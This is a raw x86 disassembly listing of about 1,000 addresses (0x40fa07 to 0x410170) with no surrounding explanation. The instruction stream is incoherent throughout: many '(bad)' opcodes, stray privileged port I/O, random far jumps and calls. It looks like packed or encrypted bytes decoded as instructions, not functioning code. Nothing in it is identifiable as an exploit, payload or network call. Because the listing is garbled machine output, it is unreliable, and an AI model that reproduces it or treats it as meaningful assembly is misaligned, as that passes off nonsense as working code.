  40fa07:	push   esp
  40fa08:	cmp    ebx,esi
  40fa0a:	and    bh,BYTE PTR [ebp-0x30]
  40fa0d:	fs dec esi
  40fa0f:	cli    
  40fa10:	shr    BYTE PTR [edx+0x8],cl
  40fa13:	bound  ebp,QWORD PTR [ecx+edx*1+0x36]
  40fa17:	jle    0x40f9c0
  40fa19:	dec    esi
  40fa1a:	fist   DWORD PTR [esi+0x3a08999b]
  40fa20:	(bad)  [ebp+0x5d51c97d]
  40fa26:	sbb    edx,edi
  40fa28:	enter  0x9fe3,0x9d
  40fa2c:	push   esi
  40fa2d:	sbb    al,0x8f
  40fa2f:	mov    ecx,0xc09eff0d
  40fa34:	xchg   DWORD PTR [edx+0x79],ebp
  40fa37:	xor    cl,BYTE PTR [esi+0x748c43a2]
  40fa3d:	out    dx,al
  40fa3e:	retf   
  40fa3f:	adc    al,0x61
  40fa41:	fucomi st,st(4)
  40fa43:	or     bl,dh
  40fa45:	push   es
  40fa46:	mov    cl,0xd8
  40fa48:	data16 mov cl,0x92
  40fa4b:	mov    bh,ch
  40fa4d:	cli    
  40fa4e:	jne    0x40fa31
  40fa50:	sbb    cl,BYTE PTR [ebp+0x5f]
  40fa53:	mov    WORD PTR [esp+edx*2-0x1719928a],?
  40fa5a:	loopne 0x40fa03
  40fa5c:	mov    bh,0x45
  40fa5e:	xor    DWORD PTR [edx-0x294d612b],0x4a
  40fa65:	xchg   esp,eax
  40fa66:	loope  0x40fa79
  40fa68:	out    dx,eax
  40fa69:	push   ss
  40fa6a:	push   0xffffffcf
  40fa6c:	push   edx
  40fa6d:	cmp    dh,BYTE PTR [ebx+eax*4+0x7e]
  40fa71:	shr    DWORD PTR [esi-0x14bfb80f],cl
  40fa77:	pop    edi
  40fa78:	mov    ch,0x26
  40fa7a:	inc    DWORD PTR [eax-0x67]
  40fa7d:	and    ebx,DWORD PTR [ecx-0x28be5782]
  40fa83:	icebp  
  40fa84:	mov    cl,0xec
  40fa86:	cld    
  40fa87:	dec    eax
  40fa88:	retf   
  40fa89:	ss adc al,0xec
  40fa8c:	jno    0x40fad0
  40fa8e:	dec    ecx
  40fa8f:	fmul   QWORD PTR [edx]
  40fa91:	in     eax,dx
  40fa92:	in     eax,dx
  40fa93:	mov    esp,0xb36a6fe3
  40fa98:	mov    al,ss:0xf269deaf
  40fa9e:	inc    esi
  40fa9f:	cld    
  40faa0:	xchg   ebp,eax
  40faa1:	out    dx,al
  40faa2:	sti    
  40faa3:	dec    eax
  40faa4:	retf   
  40faa5:	pop    edx
  40faa6:	push   ebp
  40faa7:	imul   ebp,DWORD PTR [edi+0xd24defc],0x79
  40faae:	push   ebp
  40faaf:	push   ebx
  40fab0:	xchg   ecx,eax
  40fab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fab2:	add    ebx,DWORD PTR [ecx]
  40fab4:	push   edx
  40fab5:	pop    eax
  40fab6:	je     0x40fa9d
  40fab8:	mov    bl,0xe2
  40faba:	add    eax,0xb5880f37
  40fabf:	xor    dh,cl
  40fac1:	ret    0xdcf
  40fac4:	dec    ebp
  40fac5:	xchg   edx,eax
  40fac6:	dec    eax
  40fac7:	inc    ebx
  40fac8:	mov    ecx,0x333507fd
  40facd:	mov    dh,0xe
  40facf:	jmp    0x40fa8b
  40fad1:	clc    
  40fad2:	pop    ss
  40fad3:	push   eax
  40fad4:	fwait
  40fad5:	not    BYTE PTR [edx]
  40fad7:	adc    BYTE PTR ss:[ecx],dh
  40fada:	ja     0x40fa5e
  40fadc:	adc    DWORD PTR [esi+0x72],ebx
  40fadf:	xchg   esi,eax
  40fae0:	ja     0x40fac3
  40fae2:	stos   BYTE PTR es:[edi],al
  40fae3:	(bad)  
  40fae4:	(bad)  [ebx]
  40fae6:	fldcw  WORD PTR [eax-0x59]
  40fae9:	test   eax,0xff755509
  40faee:	and    esi,esp
  40faf0:	pop    ebx
  40faf1:	inc    ebp
  40faf2:	test   eax,0x973fc90d
  40faf7:	mov    eax,0xb05d426b
  40fafc:	imul   edx,DWORD PTR [edx+0x47],0xffffffae
  40fb00:	call   0xed8b:0xd1050b7b
  40fb07:	icebp  
  40fb08:	clc    
  40fb09:	mov    bh,0xb2
  40fb0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb0c:	sbb    al,0x8b
  40fb0e:	push   esp
  40fb0f:	jecxz  0x40fa95
  40fb11:	sbb    BYTE PTR [edx],ch
  40fb13:	and    al,0xd9
  40fb15:	aam    0x79
  40fb17:	imul   ecx,esi,0xffffffea
  40fb1a:	into   
  40fb1b:	std    
  40fb1c:	(bad)  
  40fb1d:	and    al,0x38
  40fb1f:	jmp    0x2210:0x517e5e4d
  40fb26:	xchg   esi,eax
  40fb27:	ret    
  40fb28:	mov    esp,0x2cd85c17
  40fb2d:	ror    DWORD PTR [edx+0x17a01e40],1
  40fb33:	xchg   ebx,eax
  40fb34:	in     eax,0x80
  40fb36:	fwait
  40fb37:	shl    DWORD PTR [eax+0x4becb0de],cl
  40fb3d:	and    BYTE PTR [edx+0x2c],bh
  40fb40:	data16 aas 
  40fb42:	push   cs
  40fb43:	cmp    bh,al
  40fb45:	dec    esi
  40fb46:	mul    DWORD PTR [ebx+0x78]
  40fb49:	pop    esp
  40fb4a:	inc    ebx
  40fb4b:	pop    ecx
  40fb4c:	fiadd  DWORD PTR [esp+ebx*1-0x47]
  40fb50:	mov    dl,0x8
  40fb52:	jl     0x40fae8
  40fb54:	and    ecx,DWORD PTR gs:[ebx+0x5053f1c3]
  40fb5b:	gs idiv dh
  40fb5e:	ins    DWORD PTR es:[edi],dx
  40fb5f:	cli    
  40fb60:	or     ah,dh
  40fb62:	mov    bl,0xab
  40fb64:	rol    DWORD PTR ds:0xd8150bc6,cl
  40fb6a:	mov    bh,0x4f
  40fb6c:	test   al,0x4f
  40fb6e:	mov    ah,0xf7
  40fb70:	pop    ds
  40fb71:	int3   
  40fb72:	inc    eax
  40fb73:	in     eax,dx
  40fb74:	jmp    0x40fbe7
  40fb76:	dec    edi
  40fb77:	or     BYTE PTR [ecx-0x24ebd27d],al
  40fb7d:	aam    0x62
  40fb7f:	fsubr  st(0),st
  40fb81:	ds ret 
  40fb83:	push   cs
  40fb84:	xchg   ecx,eax
  40fb85:	cmp    al,0xb2
  40fb87:	or     DWORD PTR [edi+eax*4+0x2910c218],edx
  40fb8e:	lahf   
  40fb8f:	pop    edx
  40fb90:	lock sbb ebp,DWORD PTR ds:0xd6a010d6
  40fb97:	jecxz  0x40fbd5
  40fb99:	repnz scas al,BYTE PTR es:[edi]
  40fb9b:	gs enterw 0xa6f0,0x9b
  40fba1:	add    DWORD PTR [eax-0x75],esp
  40fba4:	cmp    BYTE PTR [ebx+0x5887412d],0xff
  40fbab:	cmp    al,0xc5
  40fbad:	pop    eax
  40fbae:	popf   
  40fbaf:	bound  eax,QWORD PTR [ecx]
  40fbb1:	mov    ebp,0x8dacd0bd
  40fbb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbb7:	mov    BYTE PTR [ecx+0x2a8dc354],dl
  40fbbd:	stos   BYTE PTR es:[edi],al
  40fbbe:	mov    eax,0x6f3e2864
  40fbc3:	lahf   
  40fbc4:	call   0x24e:0xf7913a5e
  40fbcb:	jl     0x40fb51
  40fbcd:	inc    eax
  40fbce:	lods   eax,DWORD PTR ds:[esi]
  40fbcf:	mov    dl,BYTE PTR ds:0x34e203f1
  40fbd5:	stos   DWORD PTR es:[edi],eax
  40fbd6:	jne    0x40fb68
  40fbd8:	cmp    bl,cl
  40fbda:	adc    dh,cl
  40fbdc:	stc    
  40fbdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbde:	iret   
  40fbdf:	mov    ds:0xa4b9d293,al
  40fbe4:	jae    0x40fb6f
  40fbe6:	(bad)  
  40fbe7:	sbb    eax,0xcb4d664f
  40fbec:	bound  ebx,QWORD PTR [esi]
  40fbee:	dec    DWORD PTR [eax-0x3d]
  40fbf1:	shl    DWORD PTR [edi+0xa],cl
  40fbf4:	push   edi
  40fbf5:	sub    ch,BYTE PTR [ebx+0x7af26ec1]
  40fbfb:	add    BYTE PTR [ebx],bh
  40fbfd:	inc    ebx
  40fbfe:	xor    dl,BYTE PTR [esi+eax*2-0x1a1699bf]
  40fc05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc06:	push   ds
  40fc07:	dec    edx
  40fc08:	int    0xab
  40fc0a:	popcnt esp,DWORD PTR [edi+edi*2-0x2c]
  40fc10:	add    al,0x7d
  40fc12:	pop    eax
  40fc13:	in     al,dx
  40fc14:	inc    eax
  40fc15:	cmp    DWORD PTR [edx-0x4d4def96],esi
  40fc1b:	inc    eax
  40fc1c:	lea    ebx,[edi]
  40fc1e:	sub    esi,DWORD PTR [ebx-0x54]
  40fc21:	and    al,0x11
  40fc23:	daa    
  40fc24:	cs jl  0x40fbd0
  40fc27:	inc    ebx
  40fc28:	stc    
  40fc29:	xor    esp,DWORD PTR [edi]
  40fc2b:	push   esp
  40fc2c:	pop    ss
  40fc2d:	xor    eax,esi
  40fc2f:	leave  
  40fc30:	add    eax,ebx
  40fc32:	jl     0x40fc15
  40fc34:	add    BYTE PTR [ebp-0x16c2381b],0xd6
  40fc3b:	nop
  40fc3c:	pop    ebx
  40fc3d:	pop    ds
  40fc3e:	push   es
  40fc3f:	push   ss
  40fc40:	(bad)  
  40fc41:	sub    bl,0xb7
  40fc44:	jecxz  0x40fc6e
  40fc46:	imul   DWORD PTR [ecx-0x66930007]
  40fc4c:	repnz inc eax
  40fc4e:	inc    edx
  40fc4f:	imul   BYTE PTR [edx+0xdf5cca7]
  40fc55:	les    edx,FWORD PTR [esi]
  40fc57:	mov    cl,0xc4
  40fc59:	jb     0x40fc24
  40fc5b:	push   ecx
  40fc5c:	mov    cl,0x43
  40fc5e:	push   ds
  40fc5f:	fbld   TBYTE PTR [eax]
  40fc61:	and    al,0x64
  40fc63:	fmul   QWORD PTR [esi]
  40fc65:	outs   dx,BYTE PTR ds:[esi]
  40fc66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc67:	fcomp  DWORD PTR [esi]
  40fc69:	pop    ss
  40fc6a:	fcomp  QWORD PTR [edx-0x4cde8e6b]
  40fc70:	scas   eax,DWORD PTR es:[edi]
  40fc71:	mov    edx,esi
  40fc73:	scas   eax,DWORD PTR es:[edi]
  40fc74:	cmp    BYTE PTR [edx+0x18],cl
  40fc77:	and    DWORD PTR [ecx-0x32ed02ea],edx
  40fc7d:	out    0xdb,al
  40fc7f:	js     0x40fce9
  40fc81:	mov    BYTE PTR [edx],ch
  40fc83:	or     al,0xfd
  40fc85:	outs   dx,BYTE PTR ds:[esi]
  40fc86:	push   es
  40fc87:	sti    
  40fc88:	jmp    0x36b328d7
  40fc8d:	jne    0x40fc4a
  40fc8f:	idiv   BYTE PTR [ebx-0x5]
  40fc92:	push   ecx
  40fc93:	pop    ss
  40fc94:	jp     0x40fcb4
  40fc96:	sbb    ah,BYTE PTR [ebx+ecx*4-0x70]
  40fc9a:	pop    es
  40fc9b:	test   BYTE PTR [ebx+0x68cd6bc7],0x16
  40fca2:	pusha  
  40fca3:	sbb    dh,BYTE PTR [edx+0x6151f6b8]
  40fca9:	out    dx,al
  40fcaa:	inc    ebp
  40fcab:	dec    edx
  40fcac:	adc    dl,BYTE PTR [ebx+0x79]
  40fcaf:	mov    WORD PTR [edx+0x2d],ss
  40fcb2:	int3   
  40fcb3:	arpl   WORD PTR ds:0x7d1711be,bx
  40fcb9:	push   edx
  40fcba:	adc    eax,0xe28a7cdf
  40fcbf:	icebp  
  40fcc0:	xchg   edi,eax
  40fcc1:	dec    ebp
  40fcc2:	sbb    ebp,ebx
  40fcc4:	pusha  
  40fcc5:	les    eax,FWORD PTR [eax-0x453902c4]
  40fccb:	mov    ah,0x81
  40fccd:	loopne 0x40fc65
  40fccf:	push   0xd0cbea29
  40fcd4:	mov    ch,0x44
  40fcd6:	rcr    bh,0x85
  40fcd9:	inc    ebp
  40fcda:	popf   
  40fcdb:	cli    
  40fcdc:	mov    ds:0xbb15e552,eax
  40fce1:	pop    esp
  40fce2:	(bad)  
  40fce3:	mov    dh,0xbc
  40fce5:	daa    
  40fce6:	sub    ebp,ecx
  40fce8:	lahf   
  40fce9:	mov    ebp,0xca686346
  40fcee:	test   BYTE PTR [edx+0x2e],bh
  40fcf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcf2:	int3   
  40fcf3:	adc    cl,BYTE PTR [edx]
  40fcf5:	repnz mov ah,0xbe
  40fcf8:	jmp    0x40fc9d
  40fcfa:	inc    edx
  40fcfb:	fucom  st(0)
  40fcfd:	enter  0xcdc2,0x73
  40fd01:	fcmove st,st(2)
  40fd03:	ret    0xc028
  40fd06:	sbb    dh,BYTE PTR [eax+0xa0ad2c]
  40fd0c:	add    ebp,DWORD PTR [edi+0x23]
  40fd0f:	sbb    al,0xd5
  40fd11:	in     eax,0x88
  40fd13:	dec    eax
  40fd14:	push   eax
  40fd15:	fldpi  
  40fd17:	and    eax,0xcc42a2f7
  40fd1c:	data16 or bh,BYTE PTR [ebx+0x60]
  40fd20:	add    DWORD PTR [esi-0x7c0e7731],esi
  40fd26:	cwde   
  40fd27:	xchg   ebx,eax
  40fd28:	ret    0xcfd
  40fd2b:	jmp    0x40fd35
  40fd2d:	add    DWORD PTR [edi+0x54],0xffffff86
  40fd31:	and    edi,DWORD PTR [ecx+0x63ccbe28]
  40fd37:	icebp  
  40fd38:	and    eax,0x626c868e
  40fd3d:	mov    eax,0xd166673a
  40fd42:	outs   dx,BYTE PTR ds:[esi]
  40fd43:	jmp    0x7111dc39
  40fd48:	retf   0x7dbb
  40fd4b:	add    DWORD PTR [ecx-0x159d780a],esi
  40fd51:	mov    eax,0xdef0cc
  40fd56:	mov    edx,DWORD PTR [edi-0x45]
  40fd59:	jns    0x40fd9d
  40fd5b:	cwde   
  40fd5c:	mov    ebx,0xa8a293ec
  40fd61:	jp     0x40fce6
  40fd63:	nop
  40fd64:	sub    BYTE PTR [esi],0x50
  40fd67:	pop    ebp
  40fd68:	addr16 or al,0x99
  40fd6b:	fidivr WORD PTR [edx+0x5bb571eb]
  40fd71:	cmp    DWORD PTR ds:0xee6bcec6,0xffffffab
  40fd78:	fistp  QWORD PTR [ebx-0x12]
  40fd7b:	pop    ebp
  40fd7c:	mov    cs,WORD PTR ds:0xf7dae3be
  40fd82:	scas   al,BYTE PTR es:[edi]
  40fd83:	das    
  40fd84:	mov    ecx,0x26d29664
  40fd89:	out    dx,al
  40fd8a:	cmc    
  40fd8b:	call   FWORD PTR [esi]
  40fd8d:	xor    BYTE PTR ds:0x983ee493,bh
  40fd93:	and    edi,DWORD PTR ds:0x7b10c1ce
  40fd99:	arpl   si,si
  40fd9b:	(bad)  
  40fd9c:	push   esi
  40fd9d:	inc    edx
  40fd9e:	dec    esi
  40fd9f:	cmpps  xmm5,XMMWORD PTR [edi-0x5fb10375],0x56
  40fda7:	(bad)  
  40fda8:	adc    edi,edi
  40fdaa:	xchg   ecx,eax
  40fdab:	stos   BYTE PTR es:[edi],al
  40fdac:	popa   
  40fdad:	adc    ebp,DWORD PTR [edx-0x5b1cc1a6]
  40fdb3:	aad    0x74
  40fdb5:	in     eax,0x4
  40fdb7:	bound  ebp,QWORD PTR [ecx+0x71]
  40fdba:	xor    eax,0xe2a4a02c
  40fdbf:	and    DWORD PTR [edx+0x2a],0x66
  40fdc3:	not    DWORD PTR [eax-0x1f9a9b48]
  40fdc9:	jp     0x40fd86
  40fdcb:	mov    al,ds:0x4fc7ed4c
  40fdd0:	retf   
  40fdd1:	dec    esp
  40fdd2:	repnz push es
  40fdd4:	fs jbe 0x40fd69
  40fdd7:	and    BYTE PTR [eax-0x377fb50e],cl
  40fddd:	push   es
  40fdde:	cdq    
  40fddf:	push   ebx
  40fde0:	fcomp  st(3)
  40fde2:	fidivr WORD PTR [ebp+0x5667795a]
  40fde8:	pavgb  mm2,QWORD PTR [eax-0x5eef0741]
  40fdef:	inc    edi
  40fdf0:	in     eax,dx
  40fdf1:	and    BYTE PTR [eax-0x434fa12a],al
  40fdf7:	shl    DWORD PTR [edi+esi*4],1
  40fdfa:	xor    eax,0xb565d95c
  40fdff:	enter  0x8b15,0xae
  40fe03:	pop    DWORD PTR [ebx]
  40fe05:	into   
  40fe06:	aam    0x75
  40fe08:	loop   0x40fde9
  40fe0a:	dec    edx
  40fe0b:	out    dx,al
  40fe0c:	shl    edx,0x86
  40fe0f:	adc    dl,BYTE PTR [ebp-0x2450b22f]
  40fe15:	dec    ebx
  40fe16:	pop    ebx
  40fe17:	or     dh,BYTE PTR [ebx+0x76]
  40fe1a:	fucomi st,st(4)
  40fe1c:	sar    ebx,cl
  40fe1e:	ins    DWORD PTR es:[edi],dx
  40fe1f:	sbb    al,0x6d
  40fe21:	popa   
  40fe22:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe24:	cmp    ecx,DWORD PTR [ebp+0x61]
  40fe27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe28:	popf   
  40fe29:	xchg   ecx,eax
  40fe2a:	std    
  40fe2b:	xor    ah,BYTE PTR [ebx]
  40fe2d:	mov    ah,0xbd
  40fe2f:	dec    esp
  40fe30:	add    esi,DWORD PTR [eax]
  40fe32:	jbe    0x40fe05
  40fe34:	ds push 0x15
  40fe37:	out    0x76,al
  40fe39:	cmp    eax,0x757fdb94
  40fe3e:	lock mov DWORD PTR [ebx+eax*4+0x31966704],edx
  40fe46:	mov    ah,0xd1
  40fe48:	mov    cl,0xf5
  40fe4a:	icebp  
  40fe4b:	js     0x40fe4d
  40fe4d:	xchg   BYTE PTR [ebx-0x76],dl
  40fe50:	inc    edx
  40fe51:	test   eax,0x90b41eeb
  40fe56:	dec    eax
  40fe57:	adc    DWORD PTR [esi],edi
  40fe59:	jl     0x40fe6b
  40fe5b:	into   
  40fe5c:	ret    0x3bd5
  40fe5f:	inc    edx
  40fe60:	(bad)  
  40fe61:	int3   
  40fe62:	hlt    
  40fe63:	sbb    dl,dl
  40fe65:	pop    eax
  40fe66:	lahf   
  40fe67:	xchg   ebp,eax
  40fe68:	les    edi,FWORD PTR ds:0x779ac2ea
  40fe6e:	fbstp  TBYTE PTR [eax+0xa8939c7]
  40fe74:	mov    ecx,es
  40fe76:	vmulsd xmm2,xmm1,QWORD PTR [eax+0x4f]
  40fe7b:	jmp    0xa78ec62e
  40fe80:	jmp    0x7f7f:0x65e6e9f
  40fe87:	ficom  DWORD PTR [esi]
  40fe89:	stc    
  40fe8a:	jnp    0x40fe1f
  40fe8c:	nop
  40fe8d:	inc    eax
  40fe8e:	cmp    eax,0xc8af4c33
  40fe93:	out    dx,al
  40fe94:	pop    ecx
  40fe95:	push   edi
  40fe96:	adc    DWORD PTR gs:[ebp+0x77],esi
  40fe9a:	xchg   ebx,eax
  40fe9b:	push   es
  40fe9c:	lock in al,dx
  40fe9e:	add    BYTE PTR [eax+0x2f60a0],ch
  40fea4:	jle    0x40fe7d
  40fea6:	jg     0x40fe79
  40fea8:	mov    dh,0x74
  40feaa:	mov    esi,edx
  40feac:	xor    DWORD PTR [esp+edx*1-0x30c30d2d],ecx
  40feb3:	mov    eax,0xa95a1bbe
  40feb8:	leave  
  40feb9:	js     0x40fe4c
  40febb:	sbb    dl,BYTE PTR [eax-0x4c]
  40febe:	imul   eax,esp,0xebdd0812
  40fec4:	mov    eax,0xdc27c51c
  40fec9:	add    BYTE PTR [ebp-0x5b],ah
  40fecc:	add    DWORD PTR [edi],eax
  40fece:	icebp  
  40fecf:	pop    eax
  40fed0:	mov    edx,0x421c1517
  40fed5:	mov    ebx,0x20eb32a1
  40feda:	cmp    eax,0x6f72ba99
  40fedf:	stc    
  40fee0:	inc    esp
  40fee1:	pushf  
  40fee2:	mov    cl,0x4b
  40fee4:	xor    eax,0x1214dfdf
  40fee9:	div    edi
  40feeb:	push   eax
  40feec:	in     eax,dx
  40feed:	pop    es
  40feee:	dec    esi
  40feef:	lea    ecx,[eax+0x67dc6249]
  40fef5:	dec    BYTE PTR [edi-0x61]
  40fef8:	or     al,0x6e
  40fefa:	sub    esp,DWORD PTR [esi+0x7058d5b8]
  40ff00:	es mov ecx,0x98d06597
  40ff06:	leave  
  40ff07:	push   eax
  40ff08:	jmp    0x40feab
  40ff0a:	inc    edx
  40ff0b:	(bad)  
  40ff0c:	cs push esp
  40ff0e:	push   ss
  40ff0f:	out    0xd,eax
  40ff11:	push   edx
  40ff12:	out    dx,al
  40ff13:	cmp    al,0x5f
  40ff15:	(bad)  
  40ff16:	and    bh,BYTE PTR [esi]
  40ff18:	sar    al,0xfa
  40ff1b:	cmp    al,0xcc
  40ff1d:	pop    ss
  40ff1e:	fimul  WORD PTR [edx]
  40ff20:	jnp    0x40ff2d
  40ff22:	fwait
  40ff23:	push   ebp
  40ff24:	push   0xfffffff3
  40ff26:	inc    edi
  40ff27:	mov    ebx,0xf2c27b57
  40ff2c:	std    
  40ff2d:	add    ecx,DWORD PTR [edi+0x1cc13710]
  40ff33:	jne    0x40febb
  40ff35:	shl    bh,1
  40ff37:	aad    0x6a
  40ff39:	sub    DWORD PTR [eax+0x22],esp
  40ff3c:	push   eax
  40ff3d:	push   ds
  40ff3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff3f:	mov    edx,0x4baa5396
  40ff44:	cmp    al,0x81
  40ff46:	mov    dh,0x34
  40ff48:	cwde   
  40ff49:	iret   
  40ff4a:	leave  
  40ff4b:	repnz test BYTE PTR [eax-0x39],bh
  40ff4f:	dec    ebp
  40ff50:	sbb    dh,BYTE PTR [ebp+0x19]
  40ff53:	lock ret 
  40ff55:	bt     ecx,ecx
  40ff58:	pusha  
  40ff59:	sbb    DWORD PTR [edx+0x4825d3d3],0xfffffff9
  40ff60:	xchg   edi,eax
  40ff61:	sub    bh,BYTE PTR [ebx+eiz*1-0x36]
  40ff65:	pop    ss
  40ff66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff67:	dec    edx
  40ff68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff69:	and    al,0xc5
  40ff6b:	jb     0x40ff54
  40ff6d:	inc    edi
  40ff6e:	imul   eax,DWORD PTR ds:0xd22057b8,0xffffffcb
  40ff75:	jp     0x40fef7
  40ff77:	sub    BYTE PTR [ecx],al
  40ff79:	fmul   QWORD PTR [edi]
  40ff7b:	sbb    al,0xcb
  40ff7d:	iret   
  40ff7e:	jns    0x40ff25
  40ff80:	adc    eax,0x452b3ac9
  40ff85:	or     edx,DWORD PTR [edx+ebp*8]
  40ff88:	mov    esp,0x2416eb28
  40ff8d:	fadd   DWORD PTR [eax]
  40ff8f:	test   ah,ch
  40ff91:	enter  0x6359,0xb4
  40ff95:	lock (bad) 
  40ff97:	jmp    0x81a3:0xdd2fbf10
  40ff9e:	lds    ecx,FWORD PTR [ebx]
  40ffa0:	(bad)  
  40ffa1:	pusha  
  40ffa2:	dec    ebp
  40ffa3:	push   ebp
  40ffa4:	pop    ebp
  40ffa5:	or     ebp,DWORD PTR [eax-0x57]
  40ffa8:	daa    
  40ffa9:	mov    ds:0xc99f3109,eax
  40ffae:	or     eax,0x87760130
  40ffb3:	sbb    al,0xa0
  40ffb5:	nop
  40ffb6:	(bad)  
  40ffb7:	in     eax,dx
  40ffb8:	xor    BYTE PTR [ebx+esi*4-0x22],bh
  40ffbc:	loope  0x41000a
  40ffbe:	jmp    0x410013
  40ffc0:	fcomp  QWORD PTR [ecx+0x3a]
  40ffc3:	mov    ?,ebp
  40ffc5:	dec    ecx
  40ffc6:	mov    al,ds:0xe5cf5dc2
  40ffcb:	push   ebp
  40ffcc:	ja     0x410027
  40ffce:	addr16 mov edi,0xa05eaefc
  40ffd4:	lock stc 
  40ffd6:	(bad)  
  40ffd7:	mov    ch,0xed
  40ffd9:	or     BYTE PTR [eax+edx*2-0x4704b181],dl
  40ffe0:	mov    ebx,DWORD PTR [edx+0x4e]
  40ffe3:	dec    esi
  40ffe4:	adc    eax,0xf0ccc7e1
  40ffe9:	sbb    al,0x51
  40ffeb:	pushf  
  40ffec:	sbb    bh,0x2a
  40ffef:	jle    0x40ffff
  40fff1:	iret   
  40fff2:	sbb    esp,esi
  40fff4:	ja     0x41002e
  40fff6:	jb     0x410018
  40fff8:	das    
  40fff9:	push   0x1a
  40fffb:	mov    eax,0x41786322
  410000:	push   0xffffffa2
  410002:	add    ebx,DWORD PTR [esi]
  410004:	addr16 jmp 0x41003e
  410007:	and    BYTE PTR [edx+0x1a16eeb1],0xed
  41000e:	loop   0x410014
  410010:	imul   edi,DWORD PTR [esi],0x7b3ac61
  410016:	jno    0x40ffe3
  410018:	into   
  410019:	add    ebx,DWORD PTR fs:[edi+0x636aa906]
  410020:	dec    esp
  410021:	adc    DWORD PTR [ebp-0x6fcb1cf],esp
  410027:	fstp   DWORD PTR [ecx]
  410029:	lods   eax,DWORD PTR ds:[esi]
  41002a:	dec    eax
  41002b:	jge    0x410022
  41002d:	shr    DWORD PTR [eax+0x5eef3e29],0xd9
  410034:	sbb    dh,BYTE PTR [edx+ecx*4]
  410037:	jmp    0x41008c
  410039:	mov    eax,ds:0xbdbd50b3
  41003e:	das    
  41003f:	hlt    
  410040:	das    
  410041:	out    0xcb,eax
  410043:	(bad)  
  410044:	fmul   st,st(2)
  410046:	clc    
  410047:	aad    0xec
  410049:	jbe    0x4100b7
  41004b:	jmp    0x410029
  41004d:	sub    esp,edx
  41004f:	ja     0x41003e
  410051:	cli    
  410052:	popa   
  410053:	mov    bh,0x1e
  410055:	lds    ebp,FWORD PTR [eax+0x4181fa45]
  41005b:	sub    ch,BYTE PTR [eax]
  41005d:	mov    bl,bh
  41005f:	cmp    al,BYTE PTR [edx+0x6935aecf]
  410065:	mov    ebx,0x15911b78
  41006a:	adc    ch,BYTE PTR [esi]
  41006c:	ds nop
  41006e:	aam    0xb8
  410070:	mov    cl,0x94
  410072:	sub    BYTE PTR [ebx],dh
  410074:	aam    0x4
  410076:	xor    al,0x9d
  410078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410079:	add    ch,ch
  41007b:	ret    0xe62b
  41007e:	jb     0x410000
  410080:	add    eax,esi
  410082:	mov    edi,0x1b7572bb
  410087:	out    0x9a,al
  410089:	(bad)  
  41008a:	mov    al,0x25
  41008c:	dec    ebp
  41008d:	popa   
  41008e:	xchg   esi,eax
  41008f:	sar    DWORD PTR [edi+0x69],cl
  410092:	jmp    0x410043
  410094:	push   ss
  410095:	lock inc edi
  410097:	add    DWORD PTR [edi-0x32],edx
  41009a:	sbb    al,0xe5
  41009c:	out    0xc4,al
  41009e:	daa    
  41009f:	jb     0x410106
  4100a1:	inc    esp
  4100a2:	jnp    0x410102
  4100a4:	stc    
  4100a5:	push   edi
  4100a6:	add    eax,0x22ebf6a5
  4100ab:	mov    ds:0x32c9c7b9,eax
  4100b0:	popf   
  4100b1:	xchg   ecx,eax
  4100b2:	cmp    eax,0x95b51e9a
  4100b7:	(bad)  
  4100b8:	cmp    DWORD PTR [ebx+0x2],edx
  4100bb:	push   ecx
  4100bc:	pushf  
  4100bd:	jecxz  0x410121
  4100bf:	or     al,0x50
  4100c1:	add    al,0xfe
  4100c3:	and    al,0xb
  4100c5:	ja     0x4100ff
  4100c7:	jnp    0x410145
  4100c9:	sub    edi,DWORD PTR [eax+0x418e3521]
  4100cf:	(bad)  
  4100d0:	outs   dx,BYTE PTR ds:[esi]
  4100d1:	cmp    eax,0x7dc78a99
  4100d6:	mov    BYTE PTR [eax+edx*1-0x77ad547f],cl
  4100dd:	push   DWORD PTR [eax+0x48efe2eb]
  4100e3:	push   edx
  4100e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100e5:	push   cs
  4100e6:	in     eax,0xac
  4100e8:	call   0x6340:0xe2d0c542
  4100ef:	jmp    0xbf7b4372
  4100f4:	and    edx,edx
  4100f6:	sub    edx,ebp
  4100f8:	popa   
  4100f9:	call   0x3d96482
  4100fe:	ret    
  4100ff:	ss xchg ecx,eax
  410101:	push   ebp
  410102:	xchg   esp,eax
  410103:	sbb    ch,BYTE PTR [ebx+ebp*4-0x37f09649]
  41010a:	shr    DWORD PTR [ecx+eiz*8-0x43],0x4e
  41010f:	stos   BYTE PTR es:[edi],al
  410110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410111:	cmp    ebp,DWORD PTR [eax]
  410113:	dec    ecx
  410114:	adc    BYTE PTR [edi],bl
  410116:	pop    ebx
  410117:	je     0x41009c
  410119:	jp     0x4100fa
  41011b:	push   edx
  41011c:	cld    
  41011d:	push   es
  41011e:	add    esp,DWORD PTR [edx]
  410120:	or     bh,BYTE PTR [ebp+0x628ceb69]
  410126:	dec    esp
  410127:	add    ah,cl
  410129:	test   DWORD PTR ds:0x607f0368,0x533b1a22
  410133:	lea    esi,[ebp-0x23]
  410136:	jle    0x41011d
  410138:	dec    ebx
  410139:	cmp    cl,BYTE PTR [ebx+0x304adf29]
  41013f:	xor    al,0x1f
  410141:	dec    ebx
  410142:	sti    
  410143:	enter  0x51bc,0xf4
  410147:	(bad)  
  410148:	fbld   TBYTE PTR [eax]
  41014a:	sar    DWORD PTR [edx-0x41272bfd],0xa
  410151:	(bad)  
  410152:	les    edi,FWORD PTR [edi-0x11e039a3]
  410158:	mov    eax,ds:0x3695375b
  41015d:	call   0x1f8d1217
  410162:	jl     0x410180
  410164:	sub    bl,BYTE PTR [edx+0x3906a4af]
  41016a:	mov    cl,0x15
  41016c:	cmp    al,0x79
